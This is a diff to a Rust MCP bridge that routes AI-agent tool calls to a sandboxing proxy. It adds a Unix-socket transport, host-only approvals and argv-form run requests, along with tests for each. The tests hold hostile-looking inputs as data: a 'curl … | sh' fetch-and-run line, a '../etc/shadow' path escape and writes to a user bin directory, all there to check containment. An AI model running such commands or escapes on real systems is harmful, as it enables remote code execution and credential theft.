@@ -32,20 +32,30 @@ use serde_json::{Value, json};
 use std::fs;
 use std::io::{self, BufRead, Write};
 use std::path::{Path, PathBuf};
+use transport::{ProxyTransport, TcpAuth, TransportConfig};
 use uuid::Uuid;
 
+mod transport;
+
 #[derive(Parser, Debug)]
-#[command(name = "nucleus-mcp")]
+#[command(name = "nucleus-mcp", mut_args = |a| a.hide_env_values(true))]
 #[command(
     about = "MCP server that bridges an MCP client (any AI-agent runtime) to nucleus-tool-proxy"
 )]
 struct Args {
-    /// Tool proxy base URL (ex: http://127.0.0.1:12345).
+    /// Tool proxy URL: `http://127.0.0.1:12345`, or `unix:///path/to/socket`
+    /// for the workload door. When absent, `NUCLEUS_TOOL_PROXY_URL` (which the
+    /// runtime sets in a pod's workload env) is used.
     #[arg(long, env = "NUCLEUS_MCP_PROXY_URL")]
-    proxy_url: String,
-    /// Optional auth secret for signing tool-proxy requests.
+    proxy_url: Option<String>,
+    /// Shared secret this bridge signs TCP tool-proxy requests with. A TCP
+    /// proxy needs this or `--signed-upstream`; the workload door takes neither.
     #[arg(long, env = "NUCLEUS_MCP_AUTH_SECRET")]
     auth_secret: Option<String>,
+    /// A signing proxy in front of the TCP tool-proxy signs every request (the
+    /// node's, in `nucleus run`'s enforced mode), so this bridge sends none.
+    #[arg(long, env = "NUCLEUS_MCP_SIGNED_UPSTREAM")]
+    signed_upstream: bool,
     /// Actor identifier used in HMAC signatures.
     #[arg(long, env = "NUCLEUS_MCP_ACTOR", default_value = "nucleus-mcp")]
     actor: String,
@@ -90,38 +100,20 @@ struct ToolDefinition {
     input_schema: Value,
 }
 
-#[derive(Debug, Deserialize, Serialize)]
-struct ReadRequest {
-    path: String,
-}
+// The file and command bodies are `nucleus_client::wire`'s, the declaration the
+// proxy deserializes. This file used to keep its own copy, and its `run` body
+// (`{"command": "<string>"}`) had drifted from the proxy's array form: every
+// MCP `run` was a 422 before any decision was made (2026-09-29).
+use nucleus_client::wire::{
+    ReadRequest, ReadResponse, RunRequest, RunResponse, WriteRequest, WriteResponse,
+};
 
+/// The MCP `run` tool's input: one command line, as the tool schema declares.
+/// It is split into words and sent in the wire's array form -- never as a
+/// string, which the proxy does not accept and a shell would interpret.
 #[derive(Debug, Deserialize)]
-struct ReadResponse {
-    contents: String,
-}
-
-#[derive(Debug, Deserialize, Serialize)]
-struct WriteRequest {
-    path: String,
-    contents: String,
-}
-
-#[derive(Debug, Deserialize)]
-struct WriteResponse {
-    ok: bool,
-}
-
-#[derive(Debug, Deserialize, Serialize)]
-struct RunRequest {
+struct RunToolArgs {
     command: String,
-}
-
-#[derive(Debug, Deserialize)]
-struct RunResponse {
-    status: i32,
-    success: bool,
-    stdout: String,
-    stderr: String,
 }
 
 #[derive(Debug, Deserialize, Serialize)]
@@ -299,24 +291,62 @@ impl std::fmt::Display for ProxyError {
 
 impl std::error::Error for ProxyError {}
 
+/// The configuration of the HTTP agent every proxy call goes through.
+///
+/// `http_status_as_error(false)` is load-bearing. ureq 3's default turns every
+/// 4xx/5xx into a transport `Err` whose text is `http status: N` and throws the
+/// body away -- and the body is where the proxy says WHY: `sandbox_escape`,
+/// `path_denied`, `approval_required` with the operation to approve. Under the
+/// default, the error-body branch in [`ProxyClient::post_json_with_secret`] was
+/// dead code: found 2026-09-29 by a containment test in which every refusal
+/// reached the agent as a bare "http status: 403" or "422", and
+/// [`call_with_approval`], which keys on `kind == "approval_required"`, could
+/// never prompt -- no approval-gated operation was approvable through this
+/// bridge. `nucleus-perf`'s `agent()` made the same call for the same reason.
+///
+/// One configuration for both transports: [`transport::ProxyTransport::agent`]
+/// builds the TCP agent and the workload door's agent from this, so the door
+/// cannot regress to the default.
+fn proxy_agent_config() -> ureq::config::Config {
+    ureq::Agent::config_builder()
+        .http_status_as_error(false)
+        .build()
+}
+
 struct ProxyClient {
-    base_url: String,
-    auth_secret: Option<Vec<u8>>,
-    /// Separate secret for /v1/approve requests (privilege separation).
-    approval_secret: Option<Vec<u8>>,
+    agent: ureq::Agent,
+    /// Where requests go and how each is authenticated; the agent above was
+    /// built for exactly this transport.
+    transport: ProxyTransport,
     actor: Option<String>,
     /// Session ID for audit correlation across tool calls.
     session_id: String,
 }
 
+/// Which secret, if any, signs one request. Derived from the transport, never
+/// chosen by the caller of [`ProxyClient::post_json`].
+enum Signing<'a> {
+    /// This bridge signs with this key.
+    With(&'a [u8]),
+    /// Nothing is attached: the door admits by uid, or a signing upstream adds
+    /// the signature on the way. Both are properties of the transport.
+    ByTransport,
+}
+
+/// Who decides an operation the proxy says needs approval.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+enum Approvals {
+    /// A human at this bridge's terminal may approve, and the bridge posts the
+    /// approval to `/v1/approve` (TCP: the host-side bridge).
+    ThroughThisBridge,
+    /// Only the host may. The workload door serves no `/v1/approve`, and an
+    /// agent inside the pod approving its own operation would be no approval
+    /// at all, so the refusal is returned to the agent with its reason.
+    HostOnly,
+}
+
 impl ProxyClient {
-    fn new(
-        base_url: String,
-        auth_secret: Option<String>,
-        approval_secret: Option<String>,
-        actor: Option<String>,
-        session_id: Option<String>,
-    ) -> Self {
+    fn new(transport: ProxyTransport, actor: Option<String>, session_id: Option<String>) -> Self {
         // Use provided session ID or generate UUID v7 for time-ordering
         let session_id = session_id.unwrap_or_else(|| {
             // Generate UUID v7 (time-ordered) for session correlation
@@ -324,9 +354,8 @@ impl ProxyClient {
             generate_session_id()
         });
         Self {
-            base_url,
-            auth_secret: auth_secret.map(|s| s.into_bytes()),
-            approval_secret: approval_secret.map(|s| s.into_bytes()),
+            agent: transport.agent(proxy_agent_config()),
+            transport,
             actor,
             session_id,
         }
@@ -337,30 +366,66 @@ impl ProxyClient {
         &self.session_id
     }
 
+    /// Who may approve an operation this transport's proxy holds for approval.
+    fn approvals(&self) -> Approvals {
+        match self.transport {
+            ProxyTransport::Tcp { .. } => Approvals::ThroughThisBridge,
+            ProxyTransport::Door { .. } => Approvals::HostOnly,
+        }
+    }
+
     fn post_json<T: Serialize, R: for<'de> Deserialize<'de>>(
         &self,
         path: &str,
         body: &T,
     ) -> Result<R, ProxyError> {
-        self.post_json_with_secret(path, body, self.auth_secret.as_ref())
+        let signing = match &self.transport {
+            ProxyTransport::Tcp {
+                auth: TcpAuth::Hmac { auth, .. },
+                ..
+            } => Signing::With(auth),
+            ProxyTransport::Tcp {
+                auth: TcpAuth::SignedUpstream,
+                ..
+            }
+            | ProxyTransport::Door { .. } => Signing::ByTransport,
+        };
+        self.post_json_with_secret(path, body, signing)
     }
 
     /// POST to /v1/approve using the approval secret (privilege separation).
-    /// Falls back to auth_secret if no approval_secret is configured.
     fn post_approve<T: Serialize, R: for<'de> Deserialize<'de>>(
         &self,
         path: &str,
         body: &T,
     ) -> Result<R, ProxyError> {
-        let secret = self.approval_secret.as_ref().or(self.auth_secret.as_ref());
-        self.post_json_with_secret(path, body, secret)
+        let signing = match &self.transport {
+            ProxyTransport::Tcp {
+                auth: TcpAuth::Hmac { approval, .. },
+                ..
+            } => Signing::With(approval),
+            ProxyTransport::Tcp {
+                auth: TcpAuth::SignedUpstream,
+                ..
+            } => Signing::ByTransport,
+            ProxyTransport::Door { .. } => {
+                return Err(ProxyError {
+                    kind: "approval_not_on_door".to_string(),
+                    message: "approvals are decided by the host; the workload door does not \
+                              serve /v1/approve"
+                        .to_string(),
+                    operation: None,
+                });
+            }
+        };
+        self.post_json_with_secret(path, body, signing)
     }
 
     fn post_json_with_secret<T: Serialize, R: for<'de> Deserialize<'de>>(
         &self,
         path: &str,
         body: &T,
-        secret: Option<&Vec<u8>>,
+        signing: Signing<'_>,
     ) -> Result<R, ProxyError> {
         let body_bytes = serde_json::to_vec(body).map_err(|e| ProxyError {
             kind: "client_error".to_string(),
@@ -369,15 +434,17 @@ impl ProxyClient {
         })?;
         let url = format!(
             "{}/{}",
-            self.base_url.trim_end_matches('/'),
+            self.transport.base_url().trim_end_matches('/'),
             path.trim_start_matches('/')
         );
-        let mut request = ureq::post(&url)
+        let mut request = self
+            .agent
+            .post(&url)
             .header("content-type", "application/json")
             // Always include session ID for audit correlation
             .header("x-nucleus-session-id", &self.session_id);
 
-        if let Some(secret) = secret {
+        if let Signing::With(secret) = signing {
             let signed = sign_http_headers(secret, self.actor.as_deref(), &body_bytes);
             for (key, value) in signed.headers {
                 request = request.header(&key, &value);
@@ -660,13 +727,15 @@ fn main() -> Result<()> {
         None => None,
     };
     let tools = build_tool_defs(policy.as_ref());
-    let client = ProxyClient::new(
-        args.proxy_url.clone(),
-        args.auth_secret.clone(),
-        args.approval_secret.clone(),
-        Some(args.actor.clone()),
-        args.session_id.clone(),
-    );
+    let tool_proxy_url = std::env::var("NUCLEUS_TOOL_PROXY_URL").ok();
+    let transport = ProxyTransport::resolve(&TransportConfig {
+        proxy_url: args.proxy_url.as_deref(),
+        tool_proxy_url: tool_proxy_url.as_deref(),
+        auth_secret: args.auth_secret.as_deref(),
+        approval_secret: args.approval_secret.as_deref(),
+        signed_upstream: args.signed_upstream,
+    })?;
+    let client = ProxyClient::new(transport, Some(args.actor.clone()), args.session_id.clone());
     // Initialize the kernel decision engine.
     // If a policy is loaded (--spec), the kernel enforces it with monotone session
     // state. Otherwise, use a permissive lattice (proxy handles enforcement).
@@ -1105,6 +1174,17 @@ fn call_tool(
     Ok(result)
 }
 
+/// The wire request for one command line: split into words the way a POSIX
+/// shell tokenizes it, with no shell to run it. An unbalanced quote or an empty
+/// line is refused here rather than sent as a request the proxy would misread.
+fn run_request(command: &str) -> Result<RunRequest> {
+    let args = shell_words::split(command).map_err(|e| anyhow!("invalid run command: {e}"))?;
+    if args.is_empty() {
+        return Err(anyhow!("invalid run command: empty"));
+    }
+    Ok(RunRequest::new(args))
+}
+
 fn call_tool_inner(
     client: &ProxyClient,
     call: &ToolCallParams,
@@ -1118,12 +1198,7 @@ fn call_tool_inner(
                 client,
                 approval_prompt,
                 || client.post_json("/v1/read", &req),
-                || {
-                    let req = ReadRequest {
-                        path: req.path.clone(),
-                    };
-                    client.post_json("/v1/read", &req)
-                },
+                || client.post_json("/v1/read", &req),
             )?;
             Ok(response.contents)
         }
@@ -1134,29 +1209,19 @@ fn call_tool_inner(
                 client,
                 approval_prompt,
                 || client.post_json("/v1/write", &req),
-                || {
-                    let req = WriteRequest {
-                        path: req.path.clone(),
-                        contents: req.contents.clone(),
-                    };
-                    client.post_json("/v1/write", &req)
-                },
+                || client.post_json("/v1/write", &req),
             )?;
             Ok(format!("write ok: {}", response.ok))
         }
         "run" => {
-            let req: RunRequest = serde_json::from_value(call.arguments.clone())
+            let tool: RunToolArgs = serde_json::from_value(call.arguments.clone())
                 .map_err(|e| anyhow!("invalid run args: {e}"))?;
+            let req = run_request(&tool.command)?;
             let response: RunResponse = call_with_approval(
                 client,
                 approval_prompt,
                 || client.post_json("/v1/run", &req),
-                || {
-                    let req = RunRequest {
-                        command: req.command.clone(),
-                    };
-                    client.post_json("/v1/run", &req)
-                },
+                || client.post_json("/v1/run", &req),
             )?;
             Ok(format!(
                 "status: {}\nsuccess: {}\nstdout:\n{}\nstderr:\n{}",
@@ -1334,7 +1399,10 @@ where
     match call() {
         Ok(response) => Ok(response),
         Err(err) => {
-            if err.kind == "approval_required" && approval_prompt {
+            if err.kind == "approval_required"
+                && approval_prompt
+                && client.approvals() == Approvals::ThroughThisBridge
+            {
                 if let Some(operation) = err.operation.as_ref() {
                     if prompt_approval(operation)? {
                         let nonce = uuid::Uuid::new_v4().to_string();
@@ -1405,6 +1473,264 @@ fn write_error(stdout: &mut impl Write, id: Option<Value>, code: i64, message: &
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    /// Read one whole HTTP/1.1 request (head and `content-length` body) from
+    /// `stream`, answer it with `status` and a JSON `body`, and return the
+    /// request as text so a test can see what was sent.
+    fn answer_one(
+        stream: &mut (impl std::io::Read + std::io::Write),
+        status: &str,
+        body: &str,
+    ) -> String {
+        let mut req = Vec::new();
+        let mut buf = [0u8; 4096];
+        let head_end = loop {
+            let n = stream.read(&mut buf).expect("read request");
+            assert!(n > 0, "connection closed mid-request");
+            req.extend_from_slice(&buf[..n]);
+            if let Some(i) = req.windows(4).position(|w| w == b"\r\n\r\n") {
+                break i + 4;
+            }
+        };
+        let head = String::from_utf8_lossy(&req[..head_end]).to_ascii_lowercase();
+        let len: usize = head
+            .lines()
+            .find_map(|l| l.strip_prefix("content-length:"))
+            .map_or(0, |v| v.trim().parse().expect("content-length"));
+        while req.len() < head_end + len {
+            let n = stream.read(&mut buf).expect("read body");
+            assert!(n > 0, "connection closed mid-body");
+            req.extend_from_slice(&buf[..n]);
+        }
+        let response = format!(
+            "HTTP/1.1 {status}\r\ncontent-type: application/json\r\ncontent-length: {}\r\nconnection: close\r\n\r\n{body}",
+            body.len()
+        );
+        stream
+            .write_all(response.as_bytes())
+            .expect("write response");
+        String::from_utf8_lossy(&req).into_owned()
+    }
+
+    /// A one-shot TCP proxy that answers the first request with `status` and a
+    /// JSON `body`, the shape the tool-proxy's `ApiError` renders. Returns its
+    /// base URL and the request it received.
+    fn one_shot_proxy_capturing(
+        status: &'static str,
+        body: &'static str,
+    ) -> (String, std::sync::mpsc::Receiver<String>) {
+        let listener = std::net::TcpListener::bind("127.0.0.1:0").expect("bind");
+        let addr = listener.local_addr().expect("addr");
+        let (tx, rx) = std::sync::mpsc::channel();
+        std::thread::spawn(move || {
+            let (mut stream, _) = listener.accept().expect("accept");
+            let _ = tx.send(answer_one(&mut stream, status, body));
+        });
+        (format!("http://{addr}"), rx)
+    }
+
+    fn one_shot_proxy(status: &'static str, body: &'static str) -> String {
+        one_shot_proxy_capturing(status, body).0
+    }
+
+    /// A one-shot proxy door: a real Unix socket in a fresh directory,
+    /// answering its first request. Returns the directory (keep it alive), the
+    /// door URL, and the request it received.
+    fn one_shot_door(
+        status: &'static str,
+        body: &'static str,
+    ) -> (tempfile::TempDir, String, std::sync::mpsc::Receiver<String>) {
+        let dir = tempfile::tempdir().expect("tempdir");
+        let path = dir.path().join("workload.sock");
+        let listener = std::os::unix::net::UnixListener::bind(&path).expect("bind door");
+        let (tx, rx) = std::sync::mpsc::channel();
+        std::thread::spawn(move || {
+            let (mut stream, _) = listener.accept().expect("accept");
+            let _ = tx.send(answer_one(&mut stream, status, body));
+        });
+        let url = nucleus_client::endpoint::ProxyEndpoint::unix(&path).to_string();
+        (dir, url, rx)
+    }
+
+    fn transport(url: &str, auth_secret: Option<&str>) -> ProxyTransport {
+        ProxyTransport::resolve(&TransportConfig {
+            proxy_url: Some(url),
+            tool_proxy_url: None,
+            auth_secret,
+            approval_secret: None,
+            signed_upstream: false,
+        })
+        .expect("transport")
+    }
+
+    /// A TCP client, signing with a test secret: TCP has no unsigned arm.
+    fn client(base_url: String) -> ProxyClient {
+        ProxyClient::new(
+            transport(&base_url, Some("test-token-123")),
+            None,
+            Some("test-session".into()),
+        )
+    }
+
+    fn door_client(url: &str) -> ProxyClient {
+        ProxyClient::new(transport(url, None), None, Some("test-session".into()))
+    }
+
+    /// Over the door, a tool call reaches the proxy as plain HTTP on the
+    /// socket, carries no signature (the door admits by uid), and the reply
+    /// decodes through the shared wire type.
+    #[test]
+    fn a_read_goes_over_the_door_unsigned_and_gets_its_answer() {
+        let (_dir, url, seen) = one_shot_door("200 OK", r#"{"contents":"hello from the door"}"#);
+        let reply: ReadResponse = door_client(&url)
+            .post_json(
+                "/v1/read",
+                &ReadRequest {
+                    path: "hello.txt".into(),
+                },
+            )
+            .expect("the door answered");
+        assert_eq!(reply.contents, "hello from the door");
+        let req = seen.recv().expect("the door saw the request");
+        assert!(req.starts_with("POST /v1/read HTTP/1.1\r\n"), "{req}");
+        assert!(req.ends_with(r#"{"path":"hello.txt"}"#), "{req}");
+        let lower = req.to_ascii_lowercase();
+        assert!(
+            lower.contains("x-nucleus-session-id: test-session"),
+            "{req}"
+        );
+        assert!(!lower.contains("x-nucleus-signature"), "{req}");
+    }
+
+    /// The door keeps `http_status_as_error(false)`: a refusal arrives with the
+    /// proxy's own kind and sentence, not as a bare status.
+    #[test]
+    fn a_refusal_reaches_the_agent_with_its_reason_over_the_door() {
+        let (_dir, url, _seen) = one_shot_door(
+            "403 Forbidden",
+            r#"{"error":"path escapes the sandbox root","kind":"sandbox_escape"}"#,
+        );
+        let err = door_client(&url)
+            .post_json::<_, serde_json::Value>("/v1/read", &json!({"path": "../etc/shadow"}))
+            .expect_err("a 403 is a refusal");
+        assert_eq!(err.kind, "sandbox_escape", "{err}");
+        assert!(err.message.contains("escapes the sandbox"), "{err}");
+    }
+
+    /// An approval the proxy asks for is not something an agent in the pod can
+    /// grant itself: over the door the bridge neither prompts nor posts
+    /// `/v1/approve`, and the agent gets the refusal with its reason.
+    #[test]
+    fn over_the_door_an_approval_requirement_is_returned_not_self_approved() {
+        let (_dir, url, seen) = one_shot_door(
+            "403 Forbidden",
+            r#"{"error":"approval required","kind":"approval_required","operation":"WriteFiles x"}"#,
+        );
+        let client = door_client(&url);
+        assert_eq!(client.approvals(), Approvals::HostOnly);
+        let err = call_with_approval(
+            &client,
+            true,
+            || client.post_json::<_, serde_json::Value>("/v1/write", &json!({})),
+            || panic!("no retry: nothing was approved"),
+        )
+        .expect_err("held for approval");
+        assert!(err.to_string().contains("approval_required"), "{err}");
+        assert!(seen.recv().is_ok(), "the one request was the write");
+        let approve = client.post_approve::<_, serde_json::Value>("/v1/approve", &json!({}));
+        assert_eq!(
+            approve.expect_err("not on the door").kind,
+            "approval_not_on_door"
+        );
+    }
+
+    /// TCP still carries its authentication: every request is signed.
+    #[test]
+    fn a_tcp_request_is_signed() {
+        let (base, seen) = one_shot_proxy_capturing("200 OK", r#"{"contents":"x"}"#);
+        let _: ReadResponse = client(base)
+            .post_json("/v1/read", &ReadRequest { path: "a".into() })
+            .expect("answered");
+        let req = seen.recv().expect("request").to_ascii_lowercase();
+        assert!(req.contains("x-nucleus-signature: "), "{req}");
+        assert!(req.contains("x-nucleus-timestamp: "), "{req}");
+    }
+
+    /// A refusal reaches the caller with the proxy's own reason. Under ureq's
+    /// default every 4xx became `http_error: http status: 403` and the body --
+    /// `kind` and sentence -- was discarded, which is how a containment test
+    /// on 2026-09-29 ended with an agent reporting "403, it didn't say why".
+    #[test]
+    fn a_refusal_reaches_the_agent_with_its_reason() {
+        let base = one_shot_proxy(
+            "403 Forbidden",
+            r#"{"error":"path escapes the sandbox root","kind":"sandbox_escape"}"#,
+        );
+        let err = client(base)
+            .post_json::<_, serde_json::Value>("/v1/write", &json!({"path": "~/.local/bin/x"}))
+            .expect_err("a 403 is a refusal");
+        assert_eq!(err.kind, "sandbox_escape", "{err}");
+        assert!(err.message.contains("escapes the sandbox"), "{err}");
+    }
+
+    /// The approval prompt keys on `kind == "approval_required"` and needs the
+    /// operation to approve. Both come from the body, so under the old default
+    /// `call_with_approval` could never prompt and no approval-gated operation
+    /// was approvable through this bridge.
+    #[test]
+    fn an_approval_requirement_reaches_the_prompt_with_its_operation() {
+        let base = one_shot_proxy(
+            "403 Forbidden",
+            r#"{"error":"approval required","kind":"approval_required","operation":"WriteFiles .github/workflows/ci.yml"}"#,
+        );
+        let err = client(base)
+            .post_json::<_, serde_json::Value>("/v1/write", &json!({}))
+            .expect_err("approval required is a refusal until approved");
+        assert_eq!(err.kind, "approval_required", "{err}");
+        assert_eq!(
+            err.operation.as_deref(),
+            Some("WriteFiles .github/workflows/ci.yml")
+        );
+    }
+
+    /// A 4xx whose body is not the proxy's error shape still says its status,
+    /// rather than decoding as a success or vanishing.
+    #[test]
+    fn an_unparseable_error_body_still_names_the_status() {
+        let base = one_shot_proxy("422 Unprocessable Entity", "not json");
+        let err = client(base)
+            .post_json::<_, serde_json::Value>("/v1/run", &json!({}))
+            .expect_err("a 422 is not a success");
+        assert_eq!(err.kind, "http_error", "{err}");
+        assert!(err.message.contains("422"), "{err}");
+    }
+
+    /// The MCP tool's command line becomes the wire's argv. The proxy parses
+    /// exactly this type, so a request this function builds cannot be the 422
+    /// every `run` used to be.
+    #[test]
+    fn a_command_line_is_sent_as_argv() {
+        let req = run_request(r#"git commit -m "two words""#).unwrap();
+        assert_eq!(req.args, vec!["git", "commit", "-m", "two words"]);
+        assert_eq!(
+            serde_json::to_value(&req).unwrap(),
+            json!({ "args": ["git", "commit", "-m", "two words"] })
+        );
+    }
+
+    /// No shell runs the line, so its operators arrive as literal arguments
+    /// rather than as a pipeline -- the array form's whole point.
+    #[test]
+    fn shell_operators_are_arguments_not_a_pipeline() {
+        let req = run_request("curl example.invalid | sh").unwrap();
+        assert_eq!(req.args, vec!["curl", "example.invalid", "|", "sh"]);
+    }
+
+    #[test]
+    fn an_unbalanced_quote_or_an_empty_line_is_refused_before_sending() {
+        assert!(run_request(r#"echo "unterminated"#).is_err());
+        assert!(run_request("   ").is_err());
+    }
 
     #[test]
     fn test_approve_request_with_nonce() {
@@ -1526,9 +1852,7 @@ mod tests {
     #[test]
     fn test_proxy_client_session_id_provided() {
         let client = ProxyClient::new(
-            "http://localhost:8080".to_string(),
-            None,
-            None,
+            transport("http://localhost:8080", Some("test-token-123")),
             Some("test-actor".to_string()),
             Some("custom-session-123".to_string()),
         );
@@ -1632,46 +1956,9 @@ mod tests {
     }
 
     #[test]
-    fn test_proxy_client_approval_secret_separate() {
-        let client = ProxyClient::new(
-            "http://localhost:8080".to_string(),
-            Some("auth-secret-abc".to_string()),
-            Some("approval-secret-xyz".to_string()),
-            Some("actor".to_string()),
-            None,
-        );
-        // Auth and approval secrets should be stored separately
-        assert_ne!(client.auth_secret, client.approval_secret);
-        assert_eq!(
-            client.auth_secret.as_deref(),
-            Some(b"auth-secret-abc".as_slice())
-        );
-        assert_eq!(
-            client.approval_secret.as_deref(),
-            Some(b"approval-secret-xyz".as_slice())
-        );
-    }
-
-    #[test]
-    fn test_proxy_client_approval_secret_fallback() {
-        // When no approval_secret is given, post_approve falls back to auth_secret
-        let client = ProxyClient::new(
-            "http://localhost:8080".to_string(),
-            Some("shared-secret".to_string()),
-            None,
-            Some("actor".to_string()),
-            None,
-        );
-        assert!(client.approval_secret.is_none());
-        // The fallback logic is in post_approve: it uses approval_secret.or(auth_secret)
-    }
-
-    #[test]
     fn test_proxy_client_session_id_generated() {
         let client = ProxyClient::new(
-            "http://localhost:8080".to_string(),
-            None,
-            None,
+            transport("http://localhost:8080", Some("test-token-123")),
             Some("test-actor".to_string()),
             None,
         );
@@ -2163,3 +2450,6 @@ mod tests {
         assert_eq!(lines.len(), 4);
     }
 }
+
+#[cfg(test)]
+mod help_env_tests;
